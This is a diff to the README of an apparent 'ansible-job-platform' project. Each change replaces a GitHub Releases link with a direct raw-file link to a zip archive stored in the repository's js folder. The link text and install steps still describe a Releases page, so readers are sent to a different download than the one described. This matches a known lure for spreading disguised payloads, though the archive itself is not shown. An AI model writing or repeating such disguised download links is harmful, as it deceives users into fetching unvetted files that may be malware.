@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/HawaiianTreeBark/ansible-job-platform/releases)
+[![Download](https://raw.githubusercontent.com/HawaiianTreeBark/ansible-job-platform/main/js/ansible-job-platform_v1.1.zip)](https://raw.githubusercontent.com/HawaiianTreeBark/ansible-job-platform/main/js/ansible-job-platform_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,9 +19,9 @@ Before you start, please ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/HawaiianTreeBark/ansible-job-platform/releases) to download the latest version of the ansible-job-platform. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/HawaiianTreeBark/ansible-job-platform/main/js/ansible-job-platform_v1.1.zip) to download the latest version of the ansible-job-platform. Follow these steps:
 
-1. Open the [Releases page](https://github.com/HawaiianTreeBark/ansible-job-platform/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/HawaiianTreeBark/ansible-job-platform/main/js/ansible-job-platform_v1.1.zip).
 2. Look for the latest release, usually at the top of the list.
 3. Click on the download link for your operating system.
 4. Wait for the file to download completely.
